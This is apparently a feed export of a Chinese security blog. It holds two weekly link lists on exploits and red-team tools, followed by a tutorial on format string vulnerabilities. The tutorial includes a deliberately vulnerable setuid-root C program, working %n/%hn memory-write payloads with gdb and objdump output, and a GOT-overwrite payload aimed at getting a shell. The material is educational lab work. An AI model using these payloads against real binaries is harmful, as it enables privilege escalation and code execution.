<li><p>逆向工程之基础编程概念<br><a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#104;&#116;&#116;&#x70;&#115;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#x69;&#x75;&#109;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x40;&#x64;&#x61;&#110;&#x69;&#101;&#108;&#97;&#98;&#x6c;&#x6f;&#111;&#x6d;&#47;&#98;&#111;&#108;&#111;&#x2d;&#x72;&#101;&#118;&#x65;&#x72;&#115;&#x65;&#x2d;&#101;&#x6e;&#x67;&#x69;&#x6e;&#101;&#x65;&#114;&#x69;&#110;&#103;&#x2d;&#x70;&#x61;&#x72;&#x74;&#x2d;&#49;&#x2d;&#98;&#x61;&#115;&#x69;&#x63;&#45;&#112;&#114;&#111;&#103;&#x72;&#97;&#109;&#x6d;&#x69;&#x6e;&#x67;&#45;&#x63;&#x6f;&#x6e;&#99;&#x65;&#112;&#x74;&#x73;&#x2d;&#102;&#56;&#x38;&#98;&#x32;&#x33;&#x33;&#x63;&#54;&#51;&#98;&#x37;">&#104;&#116;&#116;&#x70;&#115;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#x69;&#x75;&#109;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x40;&#x64;&#x61;&#110;&#x69;&#101;&#108;&#97;&#98;&#x6c;&#x6f;&#111;&#x6d;&#47;&#98;&#111;&#108;&#111;&#x2d;&#x72;&#101;&#118;&#x65;&#x72;&#115;&#x65;&#x2d;&#101;&#x6e;&#x67;&#x69;&#x6e;&#101;&#x65;&#114;&#x69;&#110;&#103;&#x2d;&#x70;&#x61;&#x72;&#x74;&#x2d;&#49;&#x2d;&#98;&#x61;&#115;&#x69;&#x63;&#45;&#112;&#114;&#111;&#103;&#x72;&#97;&#109;&#x6d;&#x69;&#x6e;&#x67;&#45;&#x63;&#x6f;&#x6e;&#99;&#x65;&#112;&#x74;&#x73;&#x2d;&#102;&#56;&#x38;&#98;&#x32;&#x33;&#x33;&#x63;&#54;&#51;&#98;&#x37;</a></p>
</li>
<li>IoT Hacker 的工具包一览<br><a href="https://systemoverlord.com/2018/04/16/the-iot-hackers-toolkit.html" target="_blank" rel="external">https://systemoverlord.com/2018/04/16/the-iot-hackers-toolkit.html</a></li>
<li>系统管理员应该知道的五种渗透测试工具和技术<br><a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#104;&#116;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#100;&#x69;&#117;&#109;&#x2e;&#x63;&#111;&#x6d;&#47;&#x40;&#x6a;&#x65;&#x72;&#x65;&#109;&#x79;&#x2e;&#x74;&#114;&#x69;&#110;&#107;&#97;&#x2f;&#102;&#x69;&#118;&#x65;&#x2d;&#112;&#101;&#110;&#116;&#x65;&#115;&#x74;&#x69;&#x6e;&#x67;&#45;&#116;&#111;&#x6f;&#x6c;&#x73;&#45;&#97;&#x6e;&#100;&#45;&#x74;&#x65;&#x63;&#x68;&#110;&#105;&#x71;&#x75;&#101;&#115;&#x2d;&#x74;&#x68;&#x61;&#x74;&#x2d;&#x73;&#x79;&#115;&#x61;&#100;&#109;&#x69;&#x6e;&#115;&#45;&#115;&#x68;&#x6f;&#x75;&#x6c;&#100;&#45;&#107;&#110;&#x6f;&#119;&#45;&#97;&#x62;&#x6f;&#x75;&#116;&#45;&#52;&#99;&#101;&#99;&#x61;&#49;&#52;&#x38;&#x38;&#98;&#x66;&#x66;">&#104;&#116;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#100;&#x69;&#117;&#109;&#x2e;&#x63;&#111;&#x6d;&#47;&#x40;&#x6a;&#x65;&#x72;&#x65;&#109;&#x79;&#x2e;&#x74;&#114;&#x69;&#110;&#107;&#97;&#x2f;&#102;&#x69;&#118;&#x65;&#x2d;&#112;&#101;&#110;&#116;&#x65;&#115;&#x74;&#x69;&#x6e;&#x67;&#45;&#116;&#111;&#x6f;&#x6c;&#x73;&#45;&#97;&#x6e;&#100;&#45;&#x74;&#x65;&#x63;&#x68;&#110;&#105;&#x71;&#x75;&#101;&#115;&#x2d;&#x74;&#x68;&#x61;&#x74;&#x2d;&#x73;&#x79;&#115;&#x61;&#100;&#109;&#x69;&#x6e;&#115;&#45;&#115;&#x68;&#x6f;&#x75;&#x6c;&#100;&#45;&#107;&#110;&#x6f;&#119;&#45;&#97;&#x62;&#x6f;&#x75;&#116;&#45;&#52;&#99;&#101;&#99;&#x61;&#49;&#52;&#x38;&#x38;&#98;&#x66;&#x66;</a></li>
<li>使用 C 语言编写简单 Unix shell 的教程<br><a href="https://brennan.io/2015/01/16/write-a-shell-in-c/" target="_blank" rel="external">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></li>
<li>XSS 漏洞利用的多个技巧<br><a href="https://enciphers.com/2018/01/24/different-tricks-to-get-xss/" target="_blank" rel="external">https://enciphers.com/2018/01/24/different-tricks-to-get-xss/</a></li>
<li>aws-security-automation - DevSecOps 与自动化安全事件响应方向的优秀资源收集仓库<br><a href="https://github.com/awslabs/aws-security-automation" target="_blank" rel="external">https://github.com/awslabs/aws-security-automation</a></li>
<li>利用 iptables 的 TPROXY 模块简单实现对所有端口的监听<br><a href="https://blog.cloudflare.com/how-we-built-spectrum/" target="_blank" rel="external">https://blog.cloudflare.com/how-we-built-spectrum/</a></li>
<li>ridrelay - 在没有域账户密码的情况下依靠 SMB 中继收集活动目录信息的工具<br><a href="https://github.com/skorov/ridrelay" target="_blank" rel="external">https://github.com/skorov/ridrelay</a></li>
<li>Jolokia RCE &amp; XSS 漏洞分析与利用(CVE-2018-1000130 、CVE-2018-1000129)<br><a href="https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html" target="_blank" rel="external">https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html</a></li>
<li>Vigor ACS Unsafe Flex AMF Java 对象反序列化漏洞披露<br><a href="https://blogs.securiteam.com/index.php/archives/3681" target="_blank" rel="external">https://blogs.securiteam.com/index.php/archives/3681</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;通过向 SNMP 配置文件注入内容实现远程命令执行&lt;br&gt;&lt;a href=&quot;https://di
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180408每周安全动态</title>
    <link href="http://kevien.github.io/2018/04/08/20180408%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/04/08/20180408安全动态/</id>
    <published>2018-04-08T05:07:42.000Z</published>
    <updated>2018-04-16T05:47:12.841Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>RID Hijacking on Windows<br><a href="http://csl.com.co/rid-hijacking/" target="_blank" rel="external">http://csl.com.co/rid-hijacking/</a></li>
<li>Linux kernel exploit stack smashing<br><a href="http://tacxingxing.com/2018/02/15/linux-kernel-exploit-stack-smashing/" target="_blank" rel="external">http://tacxingxing.com/2018/02/15/linux-kernel-exploit-stack-smashing/</a></li>
<li>Mimikatz 的 DCShadow 使用方法介绍<br><a href="http://www.labofapenetrationtester.com/2018/04/dcshadow.html" target="_blank" rel="external">http://www.labofapenetrationtester.com/2018/04/dcshadow.html</a></li>
<li>Astra - REST API 安全测试框架<br>&lt; <a href="https://github.com/flipkart-incubator/astra&gt;" target="_blank" rel="external">https://github.com/flipkart-incubator/astra&gt;</a></li>
<li>将程序打包成 Windows 安装程序(.msi)以绕过白名单防御<br><a href="https://homjxi0e.wordpress.com/2018/04/01/building-windows-installer-package-msi-payload/" target="_blank" rel="external">https://homjxi0e.wordpress.com/2018/04/01/building-windows-installer-package-msi-payload/</a></li>
<li>ARM 上的 ShellCode 编写与漏洞利用开发<br><a href="https://github.com/invictus1306/Workshop-BSidesMunich2018/blob/master/workshop_slides.pdf" target="_blank" rel="external">https://github.com/invictus1306/Workshop-BSidesMunich2018/blob/master/workshop_slides.pdf</a></li>
<li>Don’t push the button or I will Yara you down, VirusTotal 平台支持自定义 Yara 规则，实时检索或发现恶意软件以及企业相关的威胁向量<br><a href="https://github.com/yt0ng/SAS/blob/master/MNeis_dont_push_the_button_SAS2017_PUBLIC.pdf" target="_blank" rel="external">https://github.com/yt0ng/SAS/blob/master/MNeis_dont_push_the_button_SAS2017_PUBLIC.pdf</a></li>
<li>DAMP - 通过修改主机安全描述符实现在域内持久化控制的项目<br><a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="external">https://github.com/HarmJ0y/DAMP</a></li>
<li>windapsearch - 通过 LDAP 查询来从 Windows domain 中枚举用户、组信息等的 Python 脚本<br><a href="https://github.com/ropnop/windapsearch" target="_blank" rel="external">https://github.com/ropnop/windapsearch</a></li>
<li>PHP trick（代码审计关注点）<br><a href="https://paper.seebug.org/561/" target="_blank" rel="external">https://paper.seebug.org/561/</a></li>
<li>spring-messaging Remote Code Execution 分析-【CVE-2018-1270】<br><a href="https://paper.seebug.org/562/" target="_blank" rel="external">https://paper.seebug.org/562/</a></li>
<li>Exim Off-by-One RCE漏洞（CVE-2018-6789）利用分析(附EXP)<br><a href="http://www.freebuf.com/vuls/166519.html" target="_blank" rel="external">http://www.freebuf.com/vuls/166519.html</a></li>
<li>四两拨千斤 —— Ubuntu kernel eBPF 0day分析<br><a href="https://security.tencent.com/index.php/blog/msg/124" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/124</a></li>
<li>AD-permissions - 活动目录权限(ACL/ACE)的审计工具<br><a href="https://github.com/ANSSI-FR/AD-permissions" target="_blank" rel="external">https://github.com/ANSSI-FR/AD-permissions</a></li>
<li>使用 Mimikatz 进行 Golden Ticket 攻击的方法介绍<br><a href="https://pentestlab.blog/2018/04/09/golden-ticket/" target="_blank" rel="external">https://pentestlab.blog/2018/04/09/golden-ticket/</a></li>
<li>LinkFinder - 从 JavaScript 文件中提取 URL 及其参数的 Python 脚本<br><a href="https://github.com/GerbenJavado/LinkFinder" target="_blank" rel="external">https://github.com/GerbenJavado/LinkFinder</a></li>
<li>破解学校网站的图片验证之使用 Python 编写图片验证码识别工具<br>&lt; <a href="https://dev.to/presto412/how-i-cracked-the-captcha-on-my-universitys-website-237j&gt;" target="_blank" rel="external">https://dev.to/presto412/how-i-cracked-the-captcha-on-my-universitys-website-237j&gt;</a></li>
<li>Windows RID 劫持攻击的 Metasploit 利用脚本发布<br><a href="https://www.rapid7.com/db/modules/post/windows/manage/rid_hijack" target="_blank" rel="external">https://www.rapid7.com/db/modules/post/windows/manage/rid_hijack</a></li>
<li>理解 Get-InjectedThread 的运行原理并进行修改使其绕过查杀<br><a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/" target="_blank" rel="external">https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/</a></li>
<li>Hooking Chrome 浏览器的 SSL 函数读取 SSL 通信数据<br><a href="https://nytrosecurity.com/2018/02/26/hooking-chromes-ssl-functions/" target="_blank" rel="external">https://nytrosecurity.com/2018/02/26/hooking-chromes-ssl-functions/</a></li>
<li>Holey Beep: Linux 提权漏洞分析与利用(CVE-2018-0492)<br><a href="https://sigint.sh/#/holeybeep" target="_blank" rel="external">https://sigint.sh/#/holeybeep</a></li>
<li>通过修改主机安全描述符实现远程提取机器上的本地用户哈希<br><a href="https://posts.specterops.io/remote-hash-extraction-on-demand-via-host-security-descriptor-modification-2cf505ec5c40" target="_blank" rel="external">https://posts.specterops.io/remote-hash-extraction-on-demand-via-host-security-descriptor-modification-2cf505ec5c40</a></li>
<li>Mimikatz misc::skeleton 域环境下设置万能密码的方法介绍<br><a href="https://pentestlab.blog/2018/04/10/skeleton-key/" target="_blank" rel="external">https://pentestlab.blog/2018/04/10/skeleton-key/</a></li>
<li>ids_bypass - 绕过 Suricata IDS 规则注入恶意数据的 POC (CVE-2018-6794)<br><a href="https://github.com/kirillwow/ids_bypass" target="_blank" rel="external">https://github.com/kirillwow/ids_bypass</a></li>
<li>JSON Web Token Security Cheat Sheet<br><a href="https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf" target="_blank" rel="external">https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf</a></li>
<li>Red Team Tips<br><a href="https://vincentyiu.co.uk/red-team-tips/" target="_blank" rel="external">https://vincentyiu.co.uk/red-team-tips/</a></li>
<li>OWASP TOP 10 物联网漏洞一览<br><a href="https://embedi.com/blog/reflecting-upon-owasp-top-10-iot-vulnerabilities/" target="_blank" rel="external">https://embedi.com/blog/reflecting-upon-owasp-top-10-iot-vulnerabilities/</a></li>
<li>将可执行文件放入 ADS 流并执行的方法 Part 2<br><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/" target="_blank" rel="external">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a></li>
<li>Linux shellcode x64 汇编代码生成脚本<br><a href="https://www.exploit-db.com/exploits/44445/" target="_blank" rel="external">https://www.exploit-db.com/exploits/44445/</a></li>
<li>Windows 反调试技术——OpenProcess 权限过滤<br><a href="https://mp.weixin.qq.com/s/XA7xzNk0uj0Dqz8-tD_G7A" target="_blank" rel="external">https://mp.weixin.qq.com/s/XA7xzNk0uj0Dqz8-tD_G7A</a></li>
<li>Spring Data Commons 远程代码执行漏洞披露(CVE-2018-1273)<br><a href="http://blog.nsfocus.net/cve-2018-1273-analysis/" target="_blank" rel="external">http://blog.nsfocus.net/cve-2018-1273-analysis/</a></li>
<li>MS-RDP 身份验证的远程代码执行漏洞(CVE-2018-0886) POC 放出<br><a href="https://blog.preempt.com/how-we-exploited-the-authentication-in-ms-rdp" target="_blank" rel="external">https://blog.preempt.com/how-we-exploited-the-authentication-in-ms-rdp</a></li>
<li>HTTPS Payload and C2 Redirectors<br><a href="https://posts.specterops.io/https-payload-and-c2-redirectors-ff8eb6f87742" target="_blank" rel="external">https://posts.specterops.io/https-payload-and-c2-redirectors-ff8eb6f87742</a></li>
<li>好奇驱使我对XSS平台的一次小研究<br><a href="http://www.bugsafe.cn/archives/240.html" target="_blank" rel="external">http://www.bugsafe.cn/archives/240.html</a></li>
<li>defineClass在java反序列化当中的利用<br><a href="https://xz.aliyun.com/t/2272" target="_blank" rel="external">https://xz.aliyun.com/t/2272</a></li>
<li>修炼 Java 之：内部类剖析<br><a href="https://www.v2ex.com/t/446518#reply1" target="_blank" rel="external">https://www.v2ex.com/t/446518#reply1</a></li>
<li>看我花式绕过校园网计费认证<br><a href="http://www.freebuf.com/articles/network/167641.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/167641.html</a></li>
<li>Java反序列 Jdk7u21 Payload 学习笔记<br><a href="https://mp.weixin.qq.com/s/_miC88X6bsomHY00FJeiCA" target="_blank" rel="external">https://mp.weixin.qq.com/s/_miC88X6bsomHY00FJeiCA</a></li>
<li>Directory Traversal with Spring MVC on Windows<br><a href="https://bl4ck.in/vulnerability/analysis/2018/04/10/Directory-Traversal-with-Spring-MVC-on-Window.html" target="_blank" rel="external">https://bl4ck.in/vulnerability/analysis/2018/04/10/Directory-Traversal-with-Spring-MVC-on-Window.html</a></li>
<li>翻译 Stealing HttpOnly Cookie via XSS<br><a href="https://xz.aliyun.com/t/2266" target="_blank" rel="external">https://xz.aliyun.com/t/2266</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RID Hijacking on Windows&lt;br&gt;&lt;a href=&quot;http://csl.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="http://kevien.github.io/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://kevien.github.io/2018/04/07/格式化字符串漏洞/</id>
    <published>2018-04-06T21:37:24.000Z</published>
    <updated>2018-06-17T18:39:40.375Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，这两天学习了一下，仅当笔记留以备忘。</li>
<li>在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。但是对于像printf这种可变参数的函数来说，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数调用者传入的格式一个一个的打印出数据。</li>
<li>测试环境ubuntuX86<h4 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h4></li>
<li><p>如下是函数printf format的参数、输入类型以及输出类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">| Parameter  |  Input Type | Output Type                    |</div><div class="line">| - - - - - -| - - - - - - | - - - - - - - - - - - - - - -  |</div><div class="line">| %d         | Value       | Decimal                        |</div><div class="line">| %u         | Value       | Unsigned decimal               |</div><div class="line">| %x         | Value       | Hexadecimal                    |</div><div class="line">| %s         | Pointer     | String                         |</div><div class="line">| %n         | Pointer     | Number of bytes written so far |</div></pre></td></tr></table></figure>
</li>
<li><p>试想有这样一种情况，我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是它传入的参数，哪些是属于函数调用者的数据。</p>
</li>
<li>vuln code<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#fmt_vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   char text[1024];</div><div class="line">   static int test_val = -72;</div><div class="line"></div><div class="line">   if(argc &lt; 2) &#123;</div><div class="line">      printf(&quot;Usage: %s &lt;text to print&gt;\n&quot;, argv[0]);</div><div class="line">      exit(0);</div><div class="line">   &#125;</div><div class="line">   strcpy(text, argv[1]);</div><div class="line"></div><div class="line">   printf(&quot;The right way to print user-controlled input:\n&quot;);</div><div class="line">   printf(&quot;%s&quot;, text);</div><div class="line"></div><div class="line"></div><div class="line">   printf(&quot;\nThe wrong way to print user-controlled input:\n&quot;);</div><div class="line">   printf(text);</div><div class="line"></div><div class="line">   printf(&quot;\n&quot;);</div><div class="line"></div><div class="line">   // Debug output</div><div class="line">   printf(&quot;[*] test_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;test_val, test_val, test_val);</div><div class="line"></div><div class="line">   exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">编译指令：</div><div class="line">gcc -g fmt_vuln.c -o fmt_vuln</div><div class="line">sudo chown root fmt_vuln</div><div class="line">sudo chmod u+s fmt_vuln</div></pre></td></tr></table></figure>
<ul>
<li>当我们输入 AAAA%08x.%08x.%08x.%08x可以看到我们读取到了保存于栈中的数据（输入的AAAA），当然如果输入的%08x更多还会读取到栈中更多的数据<br><img src="/2018/04/07/格式化字符串漏洞/memread.png" alt=""></li>
<li>如果写入的AAAA是一个敏感的地址呢，比如指向敏感字符串的地址。<br><img src="/2018/04/07/格式化字符串漏洞/readspecifyadd.png" alt=""><h4 id="任意内存写入"><a href="#任意内存写入" class="headerlink" title="任意内存写入"></a>任意内存写入</h4></li>
<li>任意内存写入需要用到%n这个不常用的参数，它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针,通过%n我们就可以修改内存中的值了。还是原来的漏洞代码。</li>
<li><p>此外还需要$的配合，如下的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printf(&quot;7th: %7$d, 4th: %4$05d\n&quot;, 10, 20, 30, 40, 50, 60, 70, 80);</div></pre></td></tr></table></figure>
</li>
<li><p>会打印输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">7th: 70, 4th: 00040</div></pre></td></tr></table></figure>
</li>
<li><p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且有效位长度是5</p>
</li>
<li>使用short writes,一个四字节的值可以使用两个%hn去完成覆盖。</li>
<li>例如下面的输入  $(printf “\x30\xa0\x04\x08\x32\xa0\x04\x08”)%43699x%4\$hn%8738x%5\$hn 会将test_val地址的值修改为0xccddaabb<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ gdb -q </div><div class="line">gdb-peda$ p/h 0xaabb - 8</div><div class="line">Size letters are meaningless in &quot;print&quot; command.</div><div class="line">gdb-peda$ p/d 0xaabb - 8</div><div class="line">$1 = 43699</div><div class="line">gdb-peda$ p/d 0xccdd - 0xaabb</div><div class="line">$2 = 8738</div><div class="line">gdb-peda$ quit</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  123</div><div class="line">The right way to print user-controlled input:</div><div class="line">123</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">123</div><div class="line">[*] test_val @ 0x0804a030 = -72 0xffffffb8</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  $(printf &quot;\x30\xa0\x04\x08\x32\xa0\x04\x08&quot;)%43699x%4\$hn%8738x%5\$hn</div><div class="line">The right way to print user-controlled input:</div><div class="line">0�2�%43699x%4$hn%8738x%5$hn</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">0�2� ...</div><div class="line">[*] test_val @ 0x0804a030 = -857888069 0xccddaabb</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="覆盖GOT表"><a href="#覆盖GOT表" class="headerlink" title="覆盖GOT表"></a>覆盖GOT表</h4><ul>
<li>可能会有人问能不能通过这种漏洞来getshell呢，答案是可以的，且方法不止一种，下面介绍一种相对来说简单且常用的方法，通过覆盖GOT表方法来getshell的trick，总体的思路就是程序最后要执行exit函数，我们覆盖exit函数的地址为shellcode的地址来达到getshell的目的。</li>
<li>我们知道一个程序可以使用共享库，那么它必然有一个存放了各个函数对应的地址的表，这个表就是PLT(procedure linkage table)。</li>
<li><p>使用objdump 查看plt section</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -d -j .plt ./fmt_vuln</div><div class="line"></div><div class="line">./fmt_vuln:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .plt:</div><div class="line"></div><div class="line">08048360 &lt;printf@plt-0x10&gt;:</div><div class="line"> 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004</div><div class="line"> 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008</div><div class="line"> 804836c:	00 00                	add    %al,(%eax)</div><div class="line">	...</div><div class="line"></div><div class="line">08048370 &lt;printf@plt&gt;:</div><div class="line"> 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c</div><div class="line"> 8048376:	68 00 00 00 00       	push   $0x0</div><div class="line"> 804837b:	e9 e0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048380 &lt;strcpy@plt&gt;:</div><div class="line"> 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010</div><div class="line"> 8048386:	68 08 00 00 00       	push   $0x8</div><div class="line"> 804838b:	e9 d0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048390 &lt;puts@plt&gt;:</div><div class="line"> 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014</div><div class="line"> 8048396:	68 10 00 00 00       	push   $0x10</div><div class="line"> 804839b:	e9 c0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483a0 &lt;__gmon_start__@plt&gt;:</div><div class="line"> 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018</div><div class="line"> 80483a6:	68 18 00 00 00       	push   $0x18</div><div class="line"> 80483ab:	e9 b0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483b0 &lt;exit@plt&gt;:</div><div class="line"> 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c</div><div class="line"> 80483b6:	68 20 00 00 00       	push   $0x20</div><div class="line"> 80483bb:	e9 a0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483c0 &lt;__libc_start_main@plt&gt;:</div><div class="line"> 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020</div><div class="line"> 80483c6:	68 28 00 00 00       	push   $0x28</div><div class="line"> 80483cb:	e9 90 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483d0 &lt;putchar@plt&gt;:</div><div class="line"> 80483d0:	ff 25 24 a0 04 08    	jmp    *0x804a024</div><div class="line"> 80483d6:	68 30 00 00 00       	push   $0x30</div><div class="line"> 80483db:	e9 80 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>如上所示可以看到exit函数的相关跳转，但是这个plt section是READONLY即只读不可修改的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -h ./fmt_vuln | grep -A1 &quot;\ .plt\ &quot;</div><div class="line"> 11 .plt          00000080  08048360  08048360  00000360  2**4</div><div class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</div></pre></td></tr></table></figure>
</li>
<li><p>但如果仔细看的话，可以知道jmp    *0x804a01c 中的jmp地址并不是一个直接的地址，而是一个指针指向的地址，即exit函数的地址是存放在地址0x804a01c处的。</p>
</li>
<li>这些个地址是存在放另外的section的，叫做global offset table(GOT),它是可写的。然后通过objdump可以获取的到。<br><img src="/2018/04/07/格式化字符串漏洞/objgot.png" alt=""> </li>
<li><p>如上说明exit函数是在0x0804a01c这个地址上的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./fmt_vuln $(printf &quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08&quot;)%49143x%4\$hn%12981x%5\$hn</div></pre></td></tr></table></figure>
</li>
